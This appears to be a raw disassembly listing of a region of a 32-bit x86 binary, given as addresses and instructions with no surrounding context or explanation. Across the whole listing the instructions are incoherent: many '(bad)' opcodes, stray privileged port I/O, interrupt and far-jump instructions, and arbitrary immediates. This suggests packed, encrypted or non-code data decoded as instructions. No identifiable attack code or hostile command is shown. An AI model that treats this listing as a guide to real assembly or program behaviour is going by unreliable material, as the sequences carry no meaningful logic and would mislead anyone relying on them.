  407e33:	mov    ebp,ds
  407e35:	push   ecx
  407e36:	and    cl,0x78
  407e39:	js     0x407ea5
  407e3b:	jl     0x407eb5
  407e3d:	js     0x407e19
  407e3f:	jg     0x407e9f
  407e41:	and    eax,0xe925b746
  407e46:	inc    eax
  407e47:	jle    0x407e06
  407e49:	stos   BYTE PTR es:[edi],al
  407e4a:	xchg   esi,eax
  407e4b:	adc    al,0x26
  407e4d:	sti    
  407e4e:	(bad)  
  407e4f:	push   edi
  407e50:	inc    ecx
  407e51:	jmp    0x407dd8
  407e53:	pop    eax
  407e54:	dec    ecx
  407e55:	mov    edx,0x8f526e17
  407e5a:	inc    ebp
  407e5b:	jne    0x407eb0
  407e5d:	push   edx
  407e5e:	or     eax,0xdb4f1c0f
  407e63:	lahf   
  407e64:	outs   dx,DWORD PTR ds:[esi]
  407e65:	sbb    DWORD PTR [ecx-0x388fe405],esi
  407e6b:	mov    ecx,0x21ac1e2
  407e70:	in     eax,0xac
  407e72:	add    esi,ebp
  407e74:	ficom  WORD PTR ds:0x6baaf9ef
  407e7a:	cli    
  407e7b:	jnp    0x407ead
  407e7d:	cld    
  407e7e:	add    DWORD PTR [esi-0x50d5823d],eax
  407e84:	mov    cl,0x52
  407e86:	pop    esi
  407e87:	jne    0x407e74
  407e89:	xor    DWORD PTR [eax+0x6d],ebx
  407e8c:	(bad)  
  407e8e:	push   edx
  407e8f:	jle    0x407ed9
  407e91:	repz dec ebp
  407e93:	jno    0x407ecb
  407e95:	jno    0x407e7c
  407e97:	mov    dl,0x51
  407e99:	mov    ecx,0xa86e9f7d
  407e9e:	jno    0x407eea
  407ea0:	stos   BYTE PTR es:[edi],al
  407ea1:	rcl    DWORD PTR [edx-0x49ef1b4b],1
  407ea7:	or     al,0xdf
  407ea9:	mov    dl,0x84
  407eab:	lds    ebp,FWORD PTR [edx+ecx*8-0x1d]
  407eaf:	push   ecx
  407eb0:	imul   edi,DWORD PTR [ebx+0x78],0x848f0592
  407eb7:	popf   
  407eb8:	cld    
  407eb9:	xchg   bh,al
  407ebb:	jg     0x407ec7
  407ebd:	scas   eax,DWORD PTR es:[edi]
  407ebe:	scas   al,BYTE PTR es:[edi]
  407ebf:	or     BYTE PTR [ecx-0x2f],0x8f
  407ec3:	scas   eax,DWORD PTR es:[edi]
  407ec4:	pop    edi
  407ec5:	cli    
  407ec6:	out    0xe5,al
  407ec8:	pop    esp
  407ec9:	pop    ds
  407eca:	inc    edx
  407ecb:	lods   eax,DWORD PTR ds:[esi]
  407ecc:	ret    
  407ecd:	(bad)  
  407ecf:	retf   0xc632
  407ed2:	jecxz  0x407e61
  407ed4:	stos   BYTE PTR es:[edi],al
  407ed5:	aam    0xc3
  407ed7:	pop    edi
  407ed8:	dec    esi
  407ed9:	push   esi
  407eda:	or     eax,0xef3a9f64
  407edf:	fs push cs
  407ee1:	scas   ax,WORD PTR es:[edi]
  407ee3:	or     bh,BYTE PTR [ebp+0x61691684]
  407ee9:	out    dx,al
  407eea:	and    ebp,DWORD PTR [esi-0x7ff2737b]
  407ef0:	xor    dl,BYTE PTR [edx-0x5d3baa22]
  407ef6:	jbe    0x407f55
  407ef8:	aam    0x1
  407efa:	pop    edx
  407efb:	xor    al,0x1f
  407efd:	xchg   edx,eax
  407efe:	outs   dx,DWORD PTR ds:[esi]
  407eff:	and    BYTE PTR [ebx],al
  407f01:	subps  xmm1,XMMWORD PTR [eax+0x60]
  407f05:	retf   0xea21
  407f08:	es push esi
  407f0a:	xchg   BYTE PTR [edi+ebx*4-0x5e],bh
  407f0e:	cmp    eax,0x49536fce
  407f13:	aaa    
  407f14:	pop    eax
  407f15:	(bad)  
  407f16:	inc    DWORD PTR [ebx-0x52]
  407f19:	cmp    eax,0xd5c5bba7
  407f1e:	adc    esi,ebp
  407f20:	adc    eax,0x8baceb5f
  407f25:	lahf   
  407f26:	add    DWORD PTR [edx],0xffffffe7
  407f29:	mov    ecx,0xc9f47ac7
  407f2e:	ja     0x407eda
  407f30:	dec    ecx
  407f31:	dec    esi
  407f32:	xchg   edi,eax
  407f33:	dec    ecx
  407f34:	test   BYTE PTR [esi],bl
  407f36:	popf   
  407f37:	adc    ah,BYTE PTR [esi+0x345e2883]
  407f3d:	jb     0x407f6e
  407f3f:	cld    
  407f40:	jecxz  0x407f25
  407f42:	(bad)  
  407f43:	out    dx,al
  407f44:	test   BYTE PTR [edx-0x7d6ae5c9],al
  407f4a:	bnd jns 0x407f07
  407f4d:	push   ebp
  407f4e:	jecxz  0x407ed6
  407f50:	arpl   WORD PTR [eax],cx
  407f52:	inc    ebx
  407f53:	adc    eax,0xb80f61d9
  407f58:	rol    bl,1
  407f5a:	in     al,dx
  407f5b:	xor    dh,BYTE PTR [esi-0x5b]
  407f5e:	adc    BYTE PTR [esi-0xb],al
  407f61:	adc    eax,0xbd2d2b8
  407f66:	sub    bh,dl
  407f68:	jmp    0xe74ac542
  407f6d:	mov    ah,ch
  407f6f:	loope  0x407eff
  407f71:	adc    eax,0xbd8d0868
  407f76:	in     eax,dx
  407f77:	add    DWORD PTR ds:0x6bcc554e,esi
  407f7d:	mov    ds:0x5cc5c2a,eax
  407f82:	mov    cl,0x66
  407f84:	(bad)  [edi]
  407f86:	sub    al,0xdc
  407f88:	jnp    0x407fe4
  407f8a:	inc    esp
  407f8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f8c:	sahf   
  407f8d:	in     eax,dx
  407f8e:	ret    
  407f8f:	les    bp,DWORD PTR [ecx]
  407f92:	out    0xd8,al
  407f94:	mov    edx,0xb68f65f1
  407f99:	retf   
  407f9a:	nop
  407f9b:	adc    esi,DWORD PTR [edi-0x53]
  407f9e:	sahf   
  407f9f:	int3   
  407fa0:	mov    DWORD PTR [ecx-0x3f4c3da9],edx
  407fa6:	push   0x76
  407fa8:	mov    al,BYTE PTR [ecx]
  407faa:	jo     0x407fd3
  407fac:	cmp    dl,ch
  407fae:	leave  
  407faf:	aaa    
  407fb0:	mov    ebp,0xa1b3e274
  407fb5:	dec    ecx
  407fb6:	sbb    ecx,DWORD PTR [eax-0x5]
  407fb9:	mov    WORD PTR [edi-0x28872676],cs
  407fbf:	ret    0xcc2d
  407fc2:	sbb    eax,0xd03bca08
  407fc7:	pop    edx
  407fc8:	push   DWORD PTR [ebx]
  407fca:	add    bl,al
  407fcc:	stos   BYTE PTR es:[edi],al
  407fcd:	jmp    0x40803d
  407fcf:	push   eax
  407fd0:	fmul   DWORD PTR [esi+0x7d]
  407fd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fd4:	test   edi,ebx
  407fd6:	lea    edi,[ecx+0x6c]
  407fd9:	sub    BYTE PTR [ebx+eiz*4-0x32],al
  407fdd:	jg     0x407fbc
  407fdf:	and    dl,dl
  407fe1:	xchg   ebx,eax
  407fe2:	(bad)  
  407fe3:	je     0x408052
  407fe5:	out    0x70,al
  407fe7:	scas   al,BYTE PTR es:[edi]
  407fe8:	and    ecx,edx
  407fea:	push   0xffffffc2
  407fec:	cmp    DWORD PTR [ebx],esp
  407fee:	sub    eax,0xda720d8
  407ff3:	mov    ds:0x9b70e593,al
  407ff8:	or     dl,BYTE PTR [ebp+0x66]
  407ffb:	xchg   esp,eax
  407ffc:	pushf  
  407ffd:	or     BYTE PTR [ebx],cl
  407fff:	clc    
  408000:	arpl   WORD PTR [ecx+0x1c],si
  408003:	leave  
  408004:	fmul   QWORD PTR [edx+0x705da1b1]
  40800a:	fs dec eax
  40800c:	adc    eax,edi
  40800e:	sub    eax,0xabf4d658
  408013:	imul   ebx,esi,0xffffffe4
  408016:	clc    
  408017:	mov    eax,ds:0xfad713fa
  40801c:	fwait
  40801d:	sbb    al,0x35
  40801f:	in     eax,0xad
  408021:	fimul  WORD PTR [eax]
  408023:	jmp    0xfecd9d0
  408028:	mov    ds:0xbc4c465f,al
  40802d:	adc    al,0x63
  40802f:	ret    0x2360
  408032:	xor    eax,edx
  408034:	out    0x2d,al
  408036:	push   0x20
  408038:	xor    al,0x29
  40803a:	jns    0x407fbf
  40803c:	mov    dh,0x82
  40803e:	push   ecx
  40803f:	loopne 0x407ffc
  408041:	mov    ecx,0xa19c9127
  408046:	mov    esp,0x1dc91692
  40804b:	sbb    eax,0xeb39e082
  408050:	xchg   BYTE PTR ss:[esi+0x4f],dh
  408054:	and    DWORD PTR [edi+0x20],esp
  408057:	xchg   ebx,eax
  408058:	mov    ah,0x65
  40805a:	dec    edx
  40805b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40805c:	add    ebp,ebp
  40805e:	cmc    
  40805f:	test   DWORD PTR [esi-0x59efc33f],edi
  408065:	ins    DWORD PTR es:[edi],dx
  408066:	sti    
  408067:	sbb    dh,dl
  408069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40806a:	and    eax,0x20524b73
  40806f:	push   esi
  408070:	mov    eax,ds:0xd58dd287
  408075:	sbb    DWORD PTR [esi+0x3e],eax
  408078:	push   ds
  408079:	mov    gs,WORD PTR [edx-0x2eede750]
  40807f:	and    eax,0xa144abf4
  408084:	pop    ebp
  408085:	sub    eax,edi
  408087:	addr16 jmp 0x80e:0xeec35bcd
  40808f:	dec    ecx
  408090:	fwait
  408091:	(bad)  
  408092:	jns    0x4080a8
  408094:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408095:	fwait
  408096:	fwait
  408097:	cmp    edx,ebp
  408099:	push   0xffffffc1
  40809b:	jne    0x408067
  40809d:	aas    
  40809e:	dec    esi
  40809f:	mov    dh,BYTE PTR [edi]
  4080a1:	and    DWORD PTR ds:0xe187283a,ebx
  4080a7:	jnp    0x4080a5
  4080a9:	lock dec edx
  4080ab:	or     bh,BYTE PTR [esi-0xb]
  4080ae:	xor    al,0xc3
  4080b0:	rcl    DWORD PTR [ecx],0xc9
  4080b3:	and    eax,0x3b57d707
  4080b8:	cmc    
  4080b9:	sar    esp,1
  4080bb:	rcl    DWORD PTR [ecx+0x7b],cl
  4080be:	lahf   
  4080bf:	cmc    
  4080c0:	mov    ebp,DWORD PTR [eax]
  4080c2:	inc    eax
  4080c3:	ret    
  4080c4:	mov    esi,0xc8a9bb10
  4080c9:	and    eax,0x3b0da0de
  4080ce:	or     al,0x20
  4080d0:	jmp    0x24a054c4
  4080d5:	rcl    DWORD PTR [ebp+0x11],0x53
  4080d9:	jno    0x4080c1
  4080db:	or     DWORD PTR [edi+0x7d],eax
  4080de:	mov    dl,0xce
  4080e0:	popf   
  4080e1:	inc    edi
  4080e2:	xchg   esp,eax
  4080e3:	xor    al,0x5b
  4080e5:	push   edx
  4080e6:	sub    ch,cl
  4080e8:	test   DWORD PTR [ecx],ecx
  4080ea:	mov    ss,WORD PTR [eax+0x73]
  4080ed:	shl    esp,0x35
  4080f0:	push   edx
  4080f1:	(bad)  
  4080f2:	ds push ds
  4080f4:	add    esi,DWORD PTR [edx]
  4080f6:	adc    BYTE PTR [ebx+0x72],dh
  4080f9:	and    DWORD PTR [esi],esi
  4080fb:	and    DWORD PTR [edi-0x66],0xffffffe5
  4080ff:	shl    BYTE PTR [bp+di-0x49],0xb
  408104:	pop    esi
  408105:	xor    eax,0xe3ec063c
  40810a:	outs   dx,BYTE PTR ds:[esi]
  40810b:	mov    al,0x5c
  40810d:	repz mov ch,0x4f
  408110:	mov    ecx,0xd8dcf53c
  408115:	sbb    DWORD PTR [ecx-0x48],esi
  408118:	test   DWORD PTR [edi+0x3030898c],ebp
  40811e:	mov    ebp,0x126ac483
  408123:	fs cs push esi
  408126:	cmc    
  408127:	pop    ebp
  408128:	cdq    
  408129:	les    esp,FWORD PTR [ebx-0x3e5dd67c]
  40812f:	cmp    al,0xa4
  408131:	and    ecx,ebp
  408133:	sar    cl,0x87
  408136:	adc    al,0x3c
  408138:	ret    0xcd8e
  40813b:	pushf  
  40813c:	repnz pop ebx
  40813e:	mov    ds:0xad40bae6,al
  408143:	mov    ecx,0xc49faecf
  408148:	das    
  408149:	or     DWORD PTR ds:0xc567525c,edi
  40814f:	out    0x69,eax
  408151:	bound  ecx,QWORD PTR [ecx-0x37]
  408154:	out    dx,eax
  408155:	pop    edi
  408156:	pop    DWORD PTR [esi-0x75]
  408159:	out    0x6d,eax
  40815b:	retf   0x5cd3
  40815e:	fstp   DWORD PTR [esi+edx*8-0x57]
  408162:	sbb    al,BYTE PTR [esi]
  408164:	mov    al,ds:0x19b39988
  408169:	adc    eax,0xb2a8dcad
  40816e:	loop   0x4080f2
  408170:	adc    al,BYTE PTR [ecx+0x67]
  408173:	pop    ecx
  408174:	xlat   BYTE PTR ds:[ebx]
  408175:	aaa    
  408176:	addr16 inc edi
  408178:	mov    bl,0xa0
  40817a:	into   
  40817b:	test   DWORD PTR [esp+edi*8+0x7f3222a3],esp
  408182:	inc    ebp
  408183:	stc    
  408184:	out    dx,al
  408185:	shl    DWORD PTR [esi],1
  408187:	(bad)  
  408189:	xor    al,0x83
  40818b:	add    BYTE PTR [eax-0x65],bl
  40818e:	lea    ecx,[ebp+0x69]
  408191:	sub    eax,0x8c568cf5
  408196:	cmp    bl,BYTE PTR [ebp+ebx*1-0xd]
  40819a:	stos   DWORD PTR es:[edi],eax
  40819b:	cmp    al,BYTE PTR [edx+0x6b]
  40819e:	clc    
  40819f:	push   eax
  4081a0:	lods   eax,DWORD PTR ds:[esi]
  4081a1:	gs pop edx
  4081a3:	xchg   esp,eax
  4081a4:	loop   0x408186
  4081a6:	push   edx
  4081a7:	mov    bl,0xf0
  4081a9:	ins    DWORD PTR es:[edi],dx
  4081aa:	inc    ebx
  4081ab:	xor    DWORD PTR [ecx+ecx*1+0xc],ecx
  4081af:	jmp    0x2b92:0xb0962080
  4081b6:	(bad)  
  4081b7:	sub    esp,DWORD PTR [eax+edx*8-0x46e89972]
  4081be:	in     al,0x1f
  4081c0:	sbb    al,0xc7
  4081c2:	iret   
  4081c3:	jns    0x408206
  4081c5:	push   ss
  4081c6:	(bad)  
  4081c7:	cmp    esp,edx
  4081c9:	in     eax,dx
  4081ca:	mov    BYTE PTR [di+0x3d5a],ah
  4081cf:	adc    cl,BYTE PTR [edi]
  4081d1:	mov    WORD PTR [ebx+0x2913f9da],ds
  4081d7:	adc    ah,dh
  4081d9:	inc    eax
  4081da:	mov    WORD PTR [ebx+eax*8-0x66a1b2e1],es
  4081e1:	out    dx,eax
  4081e2:	xor    al,0x90
  4081e4:	into   
  4081e5:	in     eax,0x4d
  4081e7:	push   esi
  4081e8:	repnz out dx,eax
  4081ea:	mov    edx,0x86b3aaff
  4081ef:	iret   
  4081f0:	mov    al,0x4
  4081f2:	or     bh,ah
  4081f4:	das    
  4081f5:	and    al,0x58
  4081f7:	ror    esp,cl
  4081f9:	mov    ah,0xed
  4081fb:	xor    ah,BYTE PTR [edx+edx*8]
  4081fe:	and    BYTE PTR [esi],al
  408200:	hlt    
  408201:	add    BYTE PTR [ecx],bl
  408203:	fidivr DWORD PTR [ecx-0x3f5000cb]
  408209:	call   0x8b611159
  40820e:	push   eax
  40820f:	xor    DWORD PTR [eax-0x6da6d09],ebp
  408215:	aad    0xdd
  408217:	push   ebp
  408218:	mov    ecx,?
  40821a:	rol    DWORD PTR [ecx],cl
  40821c:	sbb    DWORD PTR [eax+0x37],0xffffffda
  408220:	mov    bl,0xf4
  408222:	(bad)  
  408223:	and    eax,0x7dcf63c
  408228:	rol    BYTE PTR [esi+eax*4+0x41],0x37
  40822d:	inc    ebp
  40822e:	scas   al,BYTE PTR es:[edi]
  40822f:	jmp    0xf4d5e7b2
  408234:	jno    0x40827f
  408236:	cmp    ebx,DWORD PTR [esi]
  408238:	div    ebp
  40823a:	ss jl  0x4081fc
  40823d:	jbe    0x408225
  40823f:	add    BYTE PTR [ecx+ecx*2],al
  408242:	mov    ecx,0xf83fd199
  408247:	xchg   edi,eax
  408248:	pop    ecx
  408249:	mov    edx,0x3c26bd63
  40824e:	outs   dx,DWORD PTR ds:[esi]
  40824f:	dec    edi
  408250:	push   ebp
  408251:	or     al,0x3b
  408253:	and    edx,DWORD PTR [edx]
  408255:	aaa    
  408256:	push   ecx
  408257:	cmp    bh,BYTE PTR [eax+0x1a73d9ce]
  40825d:	push   0x463c6ab2
  408262:	xchg   BYTE PTR [esi],ch
  408264:	mov    DWORD PTR [esi-0x33],esi
  408267:	sub    DWORD PTR [ecx+eax*8],edx
  40826a:	push   ds
  40826b:	mov    dh,0x3b
  40826d:	inc    ecx
  40826e:	sub    eax,0xd6a4f2b7
  408273:	leave  
  408274:	mov    edi,0x9f1049f9
  408279:	sbb    al,0x8b
  40827b:	test   DWORD PTR [edi+edx*8],0x77c7331a
  408282:	rol    DWORD PTR [ebp-0x1a],1
  408285:	sbb    dh,BYTE PTR ds:0xb6c2f820
  40828b:	pop    eax
  40828c:	in     eax,0x7d
  40828e:	xor    BYTE PTR [ebp+0x5c274957],bh
  408294:	lds    edi,FWORD PTR [edi-0x3023d76]
  40829a:	cmp    BYTE PTR [edx+eax*2],ah
  40829d:	adc    eax,0xe2b2ad9a
  4082a2:	mov    ds:0x265806cb,eax
  4082a7:	xor    esp,edx
  4082a9:	in     al,0xc0
  4082ab:	xor    BYTE PTR [ecx+eax*8],ah
  4082ae:	inc    esp
  4082af:	mov    ch,BYTE PTR [esi]
  4082b1:	add    esp,DWORD PTR [edi-0x65]
  4082b4:	fidiv  DWORD PTR [edx+eax*2-0x5814d9b4]
  4082bb:	out    0x51,eax
  4082bd:	ret    0xef30
  4082c0:	retf   0x387d
  4082c3:	call   0xe7e65184
  4082c8:	cmp    ch,cl
  4082ca:	jecxz  0x408264
  4082cc:	inc    ebp
  4082cd:	jne    0x4082d1
  4082cf:	icebp  
  4082d0:	add    eax,0xf4c95bce
  4082d5:	push   eax
  4082d6:	jle    0x408327
  4082d8:	ss xor al,0x5a
  4082db:	adc    ebp,DWORD PTR [edx]
  4082dd:	pop    ebx
  4082de:	pop    ecx
  4082df:	push   eax
  4082e0:	xor    eax,DWORD PTR [esi+0x2d]
  4082e3:	aad    0x24
  4082e5:	ins    DWORD PTR es:[edi],dx
  4082e6:	mov    cl,0xe3
  4082e8:	les    edi,FWORD PTR [ecx]
  4082ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082eb:	ficomp WORD PTR [edx-0x63b75a4]
  4082f1:	push   es
  4082f2:	add    bh,BYTE PTR [edi+0x1ee5afaa]
  4082f8:	add    bh,BYTE PTR [eax-0x1fbdca0b]
  4082fe:	(bad)  
  4082ff:	rcr    DWORD PTR [edi+0x26],1
  408302:	fimul  WORD PTR [ebx-0xdcabfa1]
  408308:	lds    edx,FWORD PTR [edx]
  40830a:	mov    edx,0xc0a21dd1
  40830f:	loope  0x408301
  408311:	outs   dx,DWORD PTR ds:[esi]
  408312:	nop
  408313:	(bad)  
  408314:	in     eax,0x5f
  408316:	cmp    DWORD PTR [eax],0x94f27e26
  40831c:	imul   eax,DWORD PTR [edx],0x7d
  40831f:	ficomp DWORD PTR [edi+0x42]
  408322:	jl     0x408335
  408324:	lahf   
  408325:	mov    ah,0x9c
  408327:	(bad)  
  408328:	repz es jp 0x408376
  40832c:	je     0x409789
  408332:	lea    eax,[ebp-0x98]
  408338:	push   eax
  408339:	mov    eax,DWORD PTR [ebp-0x1c]
  40833c:	xor    eax,esi
  40833e:	add    eax,edi
  408340:	push   eax
  408341:	jmp    0x40884c
  408346:	aas    
  408347:	int    0x3c
  408349:	(bad)  
  40834a:	rcr    cl,cl
  40834c:	retf   
  40834d:	aad    0xf3
  40834f:	(bad)  
  408350:	inc    edi
  408351:	sbb    DWORD PTR [edi],edx
  408353:	jmp    0x7878:0xe4ecbf2a
  40835a:	push   0x7c
  40835c:	js     0x4083d6
  40835e:	jb     0x4083dd
  408360:	popa   
  408361:	mov    BYTE PTR [esi+edi*1-0x5f],cl
  408365:	sub    eax,0xecd77c28
  40836a:	addr16 push 0xffffff95
  40836d:	iret   
  40836e:	ja     0x40836f
  408370:	sub    al,0x4
  408372:	iret   
  408373:	push   cs
  408374:	mov    eax,ds:0x59193255
  408379:	sub    BYTE PTR [ebx+ecx*1-0x7a],bh
  40837d:	push   ss
  40837e:	push   0xb6459991
  408383:	mov    ah,0xde
  408385:	das    
  408386:	in     al,0x72
  408388:	out    0x4a,eax
  40838a:	fcomp  QWORD PTR [ebx+0x3f]
  40838d:	je     0x40835f
  40838f:	ret    0xccab
  408392:	sahf   
  408393:	pop    edx
  408394:	push   edi
  408395:	mov    ebx,0x149aab37
  40839a:	jmp    0x67490517
  40839f:	push   ebx
  4083a0:	cmp    BYTE PTR [ecx+ebx*1-0x2f],ch
  4083a4:	das    
  4083a5:	imul   edi
  4083a7:	bound  ebp,QWORD PTR [eax]
  4083a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083aa:	test   edx,edx
  4083ac:	lods   al,BYTE PTR ds:[esi]
  4083ad:	in     eax,0x53
  4083af:	inc    eax
  4083b0:	mov    eax,0x7089cb4c
  4083b5:	and    cl,BYTE PTR [ecx-0x24256b50]
  4083bb:	inc    ebx
  4083bc:	xchg   al,bh
  4083be:	pop    ebp
  4083bf:	loopne 0x408382
  4083c1:	lahf   
  4083c2:	addr16 retf 0xada
  4083c6:	dec    edx
  4083c7:	xor    dl,0x65
  4083ca:	pop    ds
  4083cb:	sub    DWORD PTR [eax+0x2b3b67a0],edi
  4083d1:	add    DWORD PTR [ebx-0x4dd2c303],eax
  4083d7:	lods   al,BYTE PTR ds:[esi]
  4083d8:	ret    
  4083d9:	lahf   
  4083da:	bound  esp,QWORD PTR [ebx-0x8]
  4083dd:	cmp    cl,BYTE PTR [ecx]
  4083df:	sub    BYTE PTR [ebx],bh
  4083e1:	mov    esp,0x192bbfa
  4083e6:	and    esi,DWORD PTR [esi-0x1d6e740a]
  4083ec:	(bad)  
  4083ed:	out    dx,al
  4083ee:	mov    WORD PTR [edx],gs
  4083f0:	jmp    0xf30c0dee
  4083f5:	adc    eax,edx
  4083f7:	(bad)  
  4083f8:	fwait
  4083f9:	lds    edi,FWORD PTR [edi+0x51]
  4083fc:	lock cmp al,0x96
  4083ff:	jmp    0xd81e:0xf1464d17
  408406:	jnp    0x408423
  408408:	test   edx,edx
  40840a:	or     BYTE PTR [ebx+0x79],bl
  40840d:	or     BYTE PTR [eax],cl
  40840f:	pop    eax
  408410:	shl    BYTE PTR [ecx-0x76],cl
  408413:	(bad)  
  408414:	aas    
  408415:	or     edi,esi
  408417:	popf   
  408418:	arpl   ax,bp
  40841a:	mov    eax,ds:0x3db98390
  40841f:	add    eax,0x772218a1
  408424:	jmp    0x408452
  408426:	sub    bl,BYTE PTR ds:0xbcf31b19
  40842c:	sbb    ah,BYTE PTR [eax]
  40842e:	sar    DWORD PTR [edi-0x39],0xd2
  408432:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408433:	(bad)  
  408434:	ficom  DWORD PTR [edi+0x3c]
  408437:	push   ss
  408438:	xchg   ecx,eax
  408439:	ficomp WORD PTR [edi+0x397c0bf4]
  40843f:	shl    WORD PTR [ebx-0x70f743df],0x77
  408447:	frstor [ebx+ecx*8]
  40844a:	mov    cl,0x55
  40844c:	sub    eax,0x99bbe7cc
  408451:	and    ebx,edx
  408453:	enter  0xcdcd,0x76
  408457:	cmp    DWORD PTR [edi],esi
  408459:	arpl   WORD PTR ds:0xdd5e5663,ax
  40845f:	in     eax,dx
  408460:	out    0x48,eax
  408462:	les    esi,FWORD PTR [ebp-0x46]
  408465:	popa   
  408466:	inc    ebp
  408467:	repz push esp
  408469:	jb     0x408480
  40846b:	rcl    DWORD PTR [esi-0x4e],0x3c
  40846f:	ret    0xe95f
  408472:	fisttp QWORD PTR [ebx+0x5dcb33a1]
  408478:	rcr    bh,1
  40847a:	cdq    
  40847b:	jnp    0x4084ee
  40847d:	sbb    BYTE PTR [ecx],bl
  40847f:	add    DWORD PTR [ecx-0x1d85612f],esp
  408485:	(bad)  
  408486:	lods   eax,DWORD PTR ss:[esi]
  408488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408489:	iret   
  40848a:	mov    dl,0x15
  40848c:	in     eax,dx
  40848d:	mov    WORD PTR [edi+0x62],cs
  408490:	ror    BYTE PTR [ecx],1
  408492:	mov    ebp,0xddf193b6
  408497:	push   ebp
  408498:	xchg   DWORD PTR [ebx+0x2a73324],esi
  40849e:	or     DWORD PTR [esi+0x2ec1968b],ecx
  4084a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084a5:	push   edx
  4084a6:	call   0x65528b61
  4084ab:	(bad)  [ebx-0x1ef70930]
  4084b1:	xchg   esi,eax
  4084b2:	aad    0x5e
  4084b4:	push   ebp
  4084b5:	sub    bl,dh
  4084b7:	xchg   ebp,eax
  4084b8:	icebp  
  4084b9:	xchg   edi,eax
  4084ba:	dec    ebx
  4084bb:	adc    edx,DWORD PTR [edi]
  4084bd:	cmp    bh,BYTE PTR [ebx+0x5bf1f29c]
  4084c3:	mov    edx,0x1c45e54
  4084c8:	cld    
  4084c9:	cli    
  4084ca:	jecxz  0x4084c3
  4084cc:	pop    eax
  4084cd:	xchg   ebx,eax
  4084ce:	mov    ah,0x1
  4084d0:	cmovg  eax,DWORD PTR [eax+ecx*1+0x2c]
  4084d5:	dec    edx
  4084d6:	mov    ch,0x89
  4084d8:	cli    
  4084d9:	mov    bl,0xde
  4084db:	push   cs
  4084dc:	adc    BYTE PTR [ebx-0x6a],ah
  4084df:	mov    dh,ah
  4084e1:	pop    eax
  4084e2:	pop    ss
  4084e3:	push   esp
  4084e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084e5:	leave  
  4084e6:	sbb    al,0x25
  4084e8:	out    0x3c,eax
  4084ea:	push   esp
  4084eb:	push   eax
  4084ec:	imul   edi,DWORD PTR [ebx-0x49],0x7b
  4084f0:	repnz (bad) 
  4084f2:	xor    al,0xf9
  4084f4:	pop    ebx
  4084f5:	fucom  st(5)
  4084f7:	xchg   ebx,eax
  4084f8:	and    al,0x5d
  4084fa:	adc    BYTE PTR [eax+0xc],ch
  4084fd:	stos   DWORD PTR es:[edi],eax
  4084fe:	aas    
  4084ff:	pop    edi
  408500:	rol    DWORD PTR [ebx+0x50],0x95
  408504:	sbb    al,0x95
  408506:	shl    BYTE PTR [eax+0x664ae93c],cl
  40850c:	cs pop ds
  40850e:	add    eax,0x73aebaf2
  408513:	adc    DWORD PTR [edx-0x5a],eax
  408516:	sub    DWORD PTR [esi+0x46047674],ebx
  40851c:	cmp    eax,0x8aa5aeed
  408521:	sub    BYTE PTR [edi-0x18dea564],ah
  408527:	pop    es
  408528:	shl    BYTE PTR [eax-0x52e411ba],cl
  40852e:	push   esp
  40852f:	je     0x408522
  408531:	lea    ecx,[ebx-0x5f]
  408534:	(bad)  
  408535:	jecxz  0x408519
  408537:	mov    esi,0x19807b5a
  40853c:	xchg   edx,eax
  40853d:	in     eax,dx
  40853e:	iret   
  40853f:	je     0x40857f
  408541:	mov    bl,0x48
  408543:	sub    ch,ch
  408545:	dec    ebx
  408546:	mov    ecx,DWORD PTR [edi+ecx*8]
  408549:	cwde   
  40854a:	rol    ebp,0x42
  40854d:	pop    ss
  40854e:	scas   al,BYTE PTR es:[edi]
  40854f:	cmp    al,0x3b
  408551:	icebp  
  408552:	nop
  408553:	packuswb mm0,QWORD PTR [edx]
  408556:	ficom  DWORD PTR [esi+0x6aad8f95]
  40855c:	adc    BYTE PTR [esi],dh
  40855e:	fidiv  DWORD PTR [eax-0x3b]
  408561:	scas   eax,DWORD PTR es:[edi]
  408562:	mov    edx,DWORD PTR [edi-0x63216255]
  408568:	sub    bl,al
  40856a:	xchg   esi,eax
  40856b:	inc    esp
  40856c:	xchg   edx,eax
  40856d:	sbb    DWORD PTR [ebp-0x18ff6f7d],edi
  408573:	mov    al,0x9f
  408575:	cs mov edi,0x91ea7b23
  40857b:	pop    es
  40857c:	mov    WORD PTR [edi+0x5d],?
  40857f:	adc    ah,ch
  408581:	fcmovnbe st,st(2)
  408583:	xchg   ebx,eax
  408584:	daa    
  408585:	adc    al,0x4b
  408587:	mov    cl,0x1c
  408589:	cli    
  40858a:	cmp    esp,edi
  40858c:	jbe    0x408537
  40858e:	add    al,0xf5
  408590:	sbb    eax,0x8fb634bf
  408595:	mov    al,ds:0xd9a16f3
  40859a:	ins    BYTE PTR es:[edi],dx
  40859b:	adc    ecx,DWORD PTR [ebp+0x514c882b]
  4085a1:	jmp    0x89323b6e
  4085a6:	fisub  WORD PTR [edi+0xa]
  4085a9:	xor    esi,DWORD PTR [ebx-0x34b64c37]
  4085af:	jge    0x408578
  4085b1:	sub    DWORD PTR [ecx],ebp
  4085b3:	cmc    
  4085b4:	lock shr ecx,0x43
  4085b8:	lds    ecx,FWORD PTR [ecx-0x5f]
  4085bb:	add    eax,0x136f7bdc
  4085c0:	daa    
  4085c1:	rcl    DWORD PTR [ebp+ebp*4-0x2a],cl
  4085c5:	push   0x21
  4085c7:	jne    0x408603
  4085c9:	mov    ecx,0x4e594af4
  4085ce:	xchg   esi,eax
  4085cf:	and    BYTE PTR [ecx],bh
  4085d1:	idiv   eax
  4085d3:	popf   
  4085d4:	packssdw mm4,QWORD PTR [esi-0xeea7dee]
  4085db:	cmp    cl,BYTE PTR [esi]
  4085dd:	jle    0x4085ae
  4085df:	mov    ds,ebx
  4085e1:	inc    ecx
  4085e2:	outs   dx,DWORD PTR ds:[esi]
  4085e3:	and    BYTE PTR [ebx+edi*1+0x73ade06e],al
  4085ea:	adc    ebx,DWORD PTR [esi-0x78]
  4085ed:	jmp    0x408571
  4085ef:	mov    di,0x1ccc
  4085f3:	dec    ebx
  4085f4:	leave  
